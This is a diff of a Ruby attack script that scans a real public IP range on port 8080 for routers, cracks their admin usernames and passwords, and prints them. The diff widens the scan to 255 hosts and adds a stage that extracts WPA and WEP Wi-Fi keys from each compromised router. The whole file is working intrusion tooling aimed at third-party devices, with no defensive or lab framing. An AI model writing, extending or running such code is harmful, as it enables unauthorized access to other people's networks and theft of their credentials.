@@ -3,16 +3,17 @@ require 'net/http'
 require "base64"
 require 'thread'
 require 'timeout'
+require './lib/routerFP'
 require './lib/objRpw'
 require './lib/joinThread'
-require './lib/routerFP'
+
 
 routers=[]
 routersCrack=[]
 threads=[]
 
 c=0
-for i in (1..100)
+for i in (1..255)
 		threads << Thread.new("190.158.217.#{i}") do |ipTmp|
 			tmp=Rpw.new(ipTmp,8080)
 			if tmp.active
@@ -33,10 +34,11 @@ routers.each do |router|
 			if routerTmp.routerType==:cisco
 				ret2=routerTmp.crack("/wlanBasic.asp");
 				if ret2 != false
-					puts "[++] #{routerTmp.ip}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
+					puts "[++] #{routerTmp.ip}:#{routerTmp.port}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
+					routersCrack << routerTmp
 				end
 			else
-				puts "[++] #{routerTmp.ip}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
+				puts "[++] #{routerTmp.ip}:#{routerTmp.port}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
 				routersCrack << routerTmp
 			end
 		else
@@ -52,3 +54,12 @@ routers.each do |router|
 end
 threads=joinThread(threads)
 puts "[+] Routers Cracked: #{routersCrack.size}"
+
+routersCrack.each do |router|
+	threads << Thread.new(router) do |routerTmp|
+		  a=routerTmp.getPasswordWifi(["WPA","WEP"])
+		  puts "[++] Router ip: #{routerTmp.ip}\t- WPA=#{a[0]}\tWEP=#{a[1]}\t type: #{routerTmp.routerType}"
+	end
+	
+end
+threads=joinThread(threads)
